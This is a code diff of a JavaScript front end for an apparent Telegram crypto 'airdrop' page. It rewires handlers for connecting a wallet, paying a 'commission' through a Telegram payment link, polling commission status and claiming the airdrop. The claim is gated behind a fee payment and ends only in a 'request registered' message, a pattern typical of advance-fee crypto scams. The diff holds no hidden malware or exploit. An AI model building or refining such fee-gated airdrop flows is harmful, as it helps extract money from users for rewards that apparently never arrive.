@@ -161,7 +161,6 @@ function stopCountdown() {
     }
 }
 
-
 function updateWalletUI() {
     const walletButtonText = document.getElementById('wallet-button-text');
     const walletIcon = document.getElementById('wallet-icon');
@@ -348,64 +347,6 @@ function updateAllTasksUI() {
     log('✅ All UIs updated');
 }
 
-async function claimAirdrop() {
-    log('🎁 Claiming airdrop...');
-    
-    if (!(tasksCompleted.task && tasksCompleted.invite && tasksCompleted.wallet && tasksCompleted.pay)) {
-        showToast('Please complete all tasks first', 'error');
-        return;
-    }
-
-    try {
-        const claimButton = document.getElementById('claimBtn');
-        if (claimButton) {
-            claimButton.disabled = true;
-            claimButton.innerHTML = '⏳ Processing your request...';
-        }
-
-        const response = await fetch('/airdrop/claim', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            }
-        });
-
-        if (response.ok) {
-            const data = await response.json();
-            log('✅ Claim successful: ' + JSON.stringify(data));
-            
-            showToast('🎉 Congratulations! Your request has been registered', 'success');
-            
-            if (claimButton) {
-                claimButton.innerHTML = '✅ Your request has been registered';
-                claimButton.style.background = 'linear-gradient(135deg, #ffd700 0%, #ffed4e 100%)';
-                claimButton.style.color = '#000';
-                claimButton.disabled = true;
-            }
-            
-        } else {
-            const error = await response.json();
-            log('❌ Claim failed: ' + JSON.stringify(error));
-            showToast('Error: ' + (error.detail || 'Please try again'), 'error');
-            
-            if (claimButton) {
-                claimButton.disabled = false;
-                claimButton.innerHTML = '🎉 Congratulations, you are eligible to receive the airdrop! 🎉';
-            }
-        }
-        
-    } catch (error) {
-        log('❌ Claim error: ' + error.message);
-        showToast('Connection error', 'error');
-        
-        const claimButton = document.getElementById('claimBtn');
-        if (claimButton) {
-            claimButton.disabled = false;
-            claimButton.innerHTML = '🎉 Congratulations, you are eligible to receive the airdrop! 🎉';
-        }
-    }
-}
-
 function showToast(message, type = 'info') {
     const existingToasts = document.querySelectorAll('.toast');
     existingToasts.forEach(toast => toast.remove());
@@ -458,62 +399,6 @@ async function handleWalletConnection() {
         log('❌ Wallet connection error: ' + error.message);
         showToast('Failed to open wallet connection: ' + error.message, 'error');
     }
-}
-
-function handleCommissionClick() {
-    if (!tasksCompleted.wallet) {
-        showToast('Please connect your wallet first', 'error');
-        return;
-    }
-    
-    if (tasksCompleted.pay) {
-        showToast('Commission has already been paid', 'info');
-        return;
-    }
-    
-    const modal = document.getElementById('commission-modal');
-    if (modal) {
-        modal.classList.add('show');
-    }
-}
-
-function closeCommissionModal() {
-    const modal = document.getElementById('commission-modal');
-    if (modal) {
-        modal.classList.remove('show');
-    }
-}
-
-function handleCommissionPayment() {
-    closeCommissionModal();
-    
-    if (!USER_ID) {
-        showToast('Error: User information not found', 'error');
-        return;
-    }
-
-    showToast('Redirecting to payment page...', 'info');
-    
-    const commissionUrl = `/commission/browser/pay?telegram_id=${USER_ID}`;
-    
-    try {
-        if (window.Telegram && window.Telegram.WebApp) {
-            window.Telegram.WebApp.openLink(commissionUrl);
-        } else {
-            window.open(commissionUrl, '_blank');
-        }
-    } catch (error) {
-        log('Error opening commission payment: ' + error.message);
-        window.location.href = commissionUrl;
-    }
-}
-
-function handleTaskCompletion() {
-    window.location.href = '/earn';
-}
-
-function handleInviteCheck() {
-    window.location.href = '/friends';
 }
 
 async function sendWalletToServer(walletAddress) {
@@ -570,7 +455,7 @@ async function claimAirdrop() {
         const claimButton = document.getElementById('claimBtn');
         if (claimButton) {
             claimButton.disabled = true;
-            claimButton.innerHTML = '⏳ Submitting request...';
+            claimButton.innerHTML = '⏳ Processing your request...';
         }
 
         const response = await fetch('/airdrop/claim', {
@@ -584,10 +469,10 @@ async function claimAirdrop() {
             const data = await response.json();
             log('✅ Claim successful: ' + JSON.stringify(data));
 
-            showToast('🎉 Congratulations! Your request has been submitted', 'success');
+            showToast('🎉 Congratulations! Your request has been registered', 'success');
 
             if (claimButton) {
-                claimButton.innerHTML = '✅ Your request has been submitted';
+                claimButton.innerHTML = '✅ Your request has been registered';
                 claimButton.style.background = 'linear-gradient(135deg, #ffd700 0%, #ffed4e 100%)';
                 claimButton.style.color = '#000';
                 claimButton.disabled = true;
@@ -597,10 +482,7 @@ async function claimAirdrop() {
             const error = await response.json();
             log('❌ Claim failed: ' + JSON.stringify(error));
 
-            showToast(
-                'Error submitting request: ' + (error.detail || 'Please try again'),
-                'error'
-            );
+            showToast('Error: ' + (error.detail || 'Please try again'), 'error');
 
             if (claimButton) {
                 claimButton.disabled = false;
@@ -610,7 +492,7 @@ async function claimAirdrop() {
 
     } catch (error) {
         log('❌ Claim error: ' + error.message);
-        showToast('Server connection error', 'error');
+        showToast('Connection error', 'error');
 
         const claimButton = document.getElementById('claimBtn');
         if (claimButton) {
@@ -620,8 +502,108 @@ async function claimAirdrop() {
     }
 }
 
+function handleTaskCompletion() {
+    window.location.href = '/earn';
+}
 
-function checkWalletStatus() {
+function handleInviteCheck() {
+    window.location.href = '/friends';
+}
+
+async function handleCommissionClick() {
+    log('🔵 Commission button clicked');
+    
+    if (!tasksCompleted.wallet || !connectedWallet) {
+        showToast('Please connect your wallet first', 'error');
+        return;
+    }
+    
+    if (tasksCompleted.pay) {
+        showToast('Commission has already been paid', 'info');
+        return;
+    }
+    
+    showToast('Sending payment link to Telegram...', 'info');
+    
+    try {
+        const response = await fetch('/commission/send_payment_link', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({telegram_id: USER_ID})
+        });
+        
+        const data = await response.json();
+        log('Payment link response: ' + JSON.stringify(data));
+        
+        if (data.success) {
+            showToast('✅ Payment link sent! Check your Telegram chat', 'success');
+        } else {
+            showToast('❌ ' + data.message, 'error');
+        }
+    } catch (error) {
+        log('Error sending payment link: ' + error.message);
+        showToast('Error: ' + error.message, 'error');
+    }
+}
+
+function handleCommissionPayment() {
+    if (!USER_ID) {
+        showToast('Error: User information not found', 'error');
+        return;
+    }
+
+    showToast('Redirecting to payment page...', 'info');
+    
+    const commissionUrl = `/commission/browser/pay?telegram_id=${USER_ID}`;
+    
+    try {
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.openLink(commissionUrl);
+        } else {
+            window.open(commissionUrl, '_blank');
+        }
+    } catch (error) {
+        log('Error opening commission payment: ' + error.message);
+        window.location.href = commissionUrl;
+    }
+}
+
+function openCommissionModal() {
+    log('Opening commission modal');
+    const modal = document.getElementById('commission-modal');
+    if (modal) {
+        modal.classList.add('show');
+    }
+}
+
+function closeCommissionModal() {
+    log('Closing commission modal');
+    const modal = document.getElementById('commission-modal');
+    if (modal) {
+        modal.classList.remove('show');
+    }
+}
+
+async function checkCommissionStatus() {
+    if (!tasksCompleted.pay && tasksCompleted.wallet && USER_ID) {
+        try {
+            const response = await fetch(`/commission/check_status?telegram_id=${USER_ID}`);
+            const data = await response.json();
+            
+            if (data.commission_paid && !tasksCompleted.pay) {
+                tasksCompleted.pay = true;
+                updateCommissionUI();
+                updateClaimButton();
+                showToast('✅ Commission payment confirmed!', 'success');
+                log('✅ Commission status updated from server');
+            }
+        } catch (error) {
+            log('Error checking commission status: ' + error.message);
+        }
+    }
+}
+
+async function checkWalletStatus() {
     const urlParams = new URLSearchParams(window.location.search);
     
     if (urlParams.has('wallet_connected')) {
@@ -657,15 +639,18 @@ function checkWalletStatus() {
     }
 }
 
+setInterval(checkCommissionStatus, 10000);
+
 window.addEventListener('DOMContentLoaded', function() {
     log('🚀 Airdrop page loaded');
     
     startCountdown();
-    
     updateAllTasksUI();
-    
     checkWalletStatus();
+    checkCommissionStatus();
     
+    log('Initial tasks status: ' + JSON.stringify(tasksCompleted));
+
     const connectWalletBtn = document.querySelector('#connect-wallet .task-button');
     if (connectWalletBtn) {
         connectWalletBtn.addEventListener('click', handleWalletConnection);
@@ -673,7 +658,7 @@ window.addEventListener('DOMContentLoaded', function() {
 
     const payCommissionBtn = document.querySelector('#pay-commission .task-button');
     if (payCommissionBtn) {
-        payCommissionBtn.addEventListener('click', handleCommissionPayment);
+        payCommissionBtn.addEventListener('click', handleCommissionClick);
     }
 
     const claimBtn = document.getElementById('claimBtn');
@@ -688,105 +673,4 @@ window.addEventListener('beforeunload', function() {
     stopCountdown();
 });
 
-
-function openCommissionModal() {
-    console.log('🔵 Opening commission modal');
-    const modal = document.getElementById('commission-modal');
-    if (modal) {
-        modal.classList.add('show');
-        console.log('✅ Modal opened');
-    } else {
-        console.error('❌ Modal element not found!');
-    }
-}
-
-function closeCommissionModal() {
-    console.log('🔵 Closing commission modal');
-    const modal = document.getElementById('commission-modal');
-    if (modal) {
-        modal.classList.remove('show');
-        console.log('✅ Modal closed');
-    }
-}
-
-async function handleCommissionClick() {
-    console.log('🔵 Commission clicked');
-    
-    if (!tasksCompleted.wallet || !connectedWallet) {
-        showToast('Connect wallet first!', 'error');
-        return;
-    }
-    if (tasksCompleted.pay) {
-        showToast('Already paid!', 'info');
-        return;
-    }
-    showToast('Sending link...', 'info');
-    try {
-        const res = await fetch('/commission/send_payment_link', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({telegram_id: USER_ID})
-        });
-        const data = await res.json();
-        console.log('Response:', data);
-        
-        if (data.success) {
-            showToast('✅ Check Telegram!', 'success');
-        } else {
-            showToast('❌ ' + data.message, 'error');
-        }
-    } catch (e) {
-        console.error('Error:', e);
-        showToast('Error: ' + e.message, 'error');
-    }
-}
-console.log('✅ airdrop.js loaded');
-
-function testCommissionButton() {
-    console.log('🟢 Button clicked!');
-    alert('Button works! Telegram ID: ' + USER_ID);
-    
-    if (!tasksCompleted.wallet || !connectedWallet) {
-        alert('❌ Please connect your wallet first!');
-        console.log('❌ Wallet not connected');
-        return;
-    }
-    
-    if (tasksCompleted.pay) {
-        alert('✅ Commission already paid!');
-        console.log('✅ Already paid');
-        return;
-    }
-    
-    console.log('🔵 Sending request to server...');
-    
-    fetch('/commission/send_payment_link', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            telegram_id: USER_ID
-        })
-    })
-    .then(response => {
-        console.log('🔵 Response status:', response.status);
-        return response.json();
-    })
-    .then(data => {
-        console.log('🔵 Response data:', data);
-        
-        if (data.success) {
-            alert('✅ Success! Check your Telegram chat.');
-            showToast('✅ Payment link sent! Check your Telegram chat.', 'success');
-        } else {
-            alert('❌ Failed: ' + data.message);
-            showToast('❌ ' + data.message, 'error');
-        }
-    })
-    .catch(error => {
-        console.error('🔴 Error:', error);
-        alert('❌ Error: ' + error.message);
-        showToast('Error: ' + error.message, 'error');
-    });
-}
+log('✅ airdrop.js loaded successfully');
